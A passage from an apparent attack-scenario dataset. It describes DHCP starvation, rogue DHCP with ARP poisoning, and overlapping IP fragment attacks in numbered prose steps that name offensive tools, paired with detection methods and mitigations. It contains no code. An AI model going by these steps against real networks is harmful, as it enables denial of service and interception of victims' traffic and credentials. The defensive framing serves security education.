Attack Steps: Step 1: Attacker connects to the local network and launches a DHCP starvation attack using tools like Yersinia or dhcpstarv. Step 2: Attacker floods the DHCP server with numerous DHCP Discover or Request packets, each spoofing unique MAC addresses to request IP leases. Step 3: The DHCP server assigns IP addresses to these fake clients, rapidly consuming the pool of available IP addresses. Step 4: Legitimate clients trying to get IP addresses fail because the DHCP pool is exhausted, causing denial of network access. Step 5: This forces victims offline or to use fallback IPs, disrupting network services. Step 6: The attacker can combine this with rogue DHCP server attacks to capture victims when they fail to get IPs from legitimate server. Step 7: Detection includes monitoring DHCP server logs for excessive lease requests or rapid depletion of IP pool. Step 8: Network admins can configure rate limiting on DHCP requests and enable DHCP snooping on switches. Step 9: Physical network access restrictions prevent attackers from easily connecting unauthorized devices. Step 10: Network segmentation and monitoring improve detection and mitigation of such attacks.
Vulnerability: No rate limiting on DHCP requests
Detection Method: DHCP server logs, alerts on lease pool exhaustion, network monitoring alerts
Solution: Rate limit DHCP requests, enable DHCP snooping, use NAC and port security

Title: DHCP Spoof + ARP Poisoning Combo
Scenario Description: Attacker combines rogue DHCP server to assign malicious network settings and ARP poisoning to intercept and manipulate victim traffic within LAN.
Attack Steps: Step 1: Attacker gains access to the local network segment (e.g., via Wi-Fi or wired access). Step 2: Attacker runs a rogue DHCP server configured to respond faster than the legitimate DHCP server, assigning victims attacker-controlled IP address, gateway, and DNS servers. Step 3: Victims request IP configuration; attacker’s rogue DHCP server responds first, causing victims to accept malicious network settings. Step 4: Attacker enables IP forwarding on their machine to route victim traffic, making the attack stealthy. Step 5: Simultaneously, attacker launches ARP poisoning (ARP spoofing) to associate their MAC address with the IP of the legitimate gateway on the LAN. Step 6: Victims’ ARP cache is poisoned, making them send traffic intended for the gateway to attacker’s machine instead. Step 7: The attacker’s machine receives all victim network traffic, acting as a man-in-the-middle, able to sniff, modify, or drop packets. Step 8: Attacker uses tools like Bettercap or Ettercap to analyze, manipulate, or inject traffic (e.g., steal credentials, inject malware). Step 9: The attacker maintains DHCP spoof and ARP poison continuously to keep control of the victim’s traffic. Step 10: Detection involves monitoring DHCP server logs for rogue responses, ARP cache anomalies, and network IDS alerts for ARP spoofing. Step 11: Network administrators should enable DHCP snooping, Dynamic ARP Inspection, and IP/MAC binding on switches. Step 12: Implement network segmentation and strong authentication to restrict unauthorized devices on LAN.
Vulnerability: No DHCP authentication, ARP trust model
Detection Method: DHCP logs anomalies, ARP cache monitoring, IDS alerts on ARP spoofing and rogue DHCP activity
Solution: Enable DHCP snooping, Dynamic ARP Inspection, use static ARP entries for critical devices, network segmentation

Title: Overlapping Fragments Attack
Scenario Description: Attacker crafts IP fragments with overlapping byte offsets to confuse the target’s IP packet reassembly process, potentially causing crashes or exploits.
Attack Steps: Step 1: Attacker obtains access to the network path to the victim or controls a machine on the same network segment. Step 2: Using packet crafting tools like Scapy, the attacker constructs an IP packet containing fragmented payloads where the fragments have overlapping offset values (e.g., fragment 2 starts before fragment 1 ends). Step 3: Sends these overlapping fragments to the target machine. Step 4: Target’s IP stack attempts to reassemble fragments based on offset but faces ambiguity due to overlaps. Different OSes handle overlaps differently; some may crash or behave unpredictably, potentially leading to denial-of-service (DoS) or exploitable conditions. Step 5: Attacker can repeat or tune payloads to trigger specific OS vulnerabilities related to fragmentation reassembly. Step 6: Detection is difficult as fragments appear normal individually; network IDS/IPS may use specialized signatures to identify overlapping fragment patterns. Step 7: Defense includes patching OS vulnerabilities, enabling fragmentation reassembly safeguards, and using modern IDS with fragmentation anomaly detection.
Impact: Denial-of-service, system crash, potential remote code execution
Detection Method: IDS/IPS alerts on abnormal fragment patterns; system crash logs
